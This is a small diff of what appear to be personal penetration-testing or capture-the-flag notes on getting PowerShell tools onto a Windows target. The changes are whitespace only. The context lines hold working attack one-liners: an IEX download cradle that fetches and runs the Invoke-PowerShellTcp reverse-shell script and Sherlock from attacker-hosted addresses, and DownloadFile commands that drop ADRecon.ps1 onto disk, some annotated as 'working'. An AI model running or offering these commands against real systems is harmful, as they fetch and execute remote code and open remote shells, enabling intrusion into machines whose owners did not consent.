@@ -5,14 +5,11 @@
                  powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8:8000/Invoke-PowerShellTcp.ps1')"
                  powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.26:8000/Sherlock.ps1'); Find-AllVulns"
                  
-                 
-
            b) way 2 : Download and Write on Disk ==>                     
                         ==> from inside of powerview       
                                   (New-Object Net.WebClient).DownloadFile('http://10.17.20.181:8000/ADRecon.ps1', 'ADRecon.ps1')                     * working both
                                   (New-Object Net.WebClient).DownloadFile('http://10.17.20.181:8000/ADRecon.ps1', './dir/ADRecon.ps1')               * working both
-                        
-                       
+                                            
                         ==> from CMD       
                                   powershell -c (New-Object Net.WebClient).DownloadFile('http://10.17.20.181:8000/ADRecon.ps1', 'ADRecon.ps1')        * working  
 
